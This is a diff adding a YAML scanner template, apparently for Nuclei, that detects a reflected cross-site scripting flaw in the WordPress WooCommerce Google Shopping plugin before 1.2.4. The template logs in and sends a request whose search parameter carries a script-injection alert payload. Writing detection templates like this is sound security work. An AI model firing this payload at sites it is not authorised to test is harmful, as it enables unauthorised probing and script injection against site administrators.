@@ -1,0 +1,48 @@
+id: elex-woocommerce-xss
+
+info:
+  name: WordPress WooCommerce Google Shopping < 1.2.4 - Reflected Cross-Site Scripting
+  author: dhiyaneshDk
+  severity: high
+  description: WordPress WooCommerce Google Shopping < 1.2.4 is susceptible to cross-site scripting because the plugin does not sanitize or escape the search GET parameter before outputting it back in the page and
+    executing it in a logged in admin context.
+  reference:
+    - https://wpscan.com/vulnerability/647448d6-32c0-4b38-a40a-3b54c55f4e2e
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 7.2
+    cwe-id: CWE-79
+  tags: wordpress,wp-plugin,xss,authenticated,woocommerce
+
+requests:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "</script><script>alert(document.domain)</script>"
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/04/13
